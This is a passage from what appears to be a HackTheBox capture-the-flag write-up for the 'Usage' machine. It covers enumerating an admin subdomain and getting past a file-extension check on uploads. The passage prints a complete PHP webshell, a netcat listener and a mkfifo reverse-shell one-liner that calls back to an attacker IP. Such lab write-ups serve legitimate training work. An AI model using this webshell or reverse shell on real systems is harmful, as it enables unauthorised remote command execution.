This page is simple login form. But the button on top right 'Admin' leads us to subdomain called 'admin.usage.htb'. Let's add the subdomain to /etc/hosts at first.

└─$ echo '<TARGET_IP> admin.usage.htb' | sudo tee -a /etc/hosts

└─$ gobuster dir -w <YOUR_WORDLIST> -u http://admin.usage.htb -t 100 > gobuster-admin.txt

We got admin user admin @ whatever1. Let's login to admin panel.

Go to the setting page, we can upload arbitrary file. But we cannot upload files rather than .png file. However, if the file extension is .png, we can upload whatever the data it has. Therefore, we can make webshell.php file on our machine, and rename it to webshell.png.

I use simple webshell by joswr1ght...

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>

mv webshell.php webshell.png

And rename the uploading file via burpsuite.

Then, head to http://admin.usage.htb/uploads/images/webshell.jpg.php and send rev-shell code.

nc -lvnp 4444 On your machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f #On the webshell

You've got reverse shell.
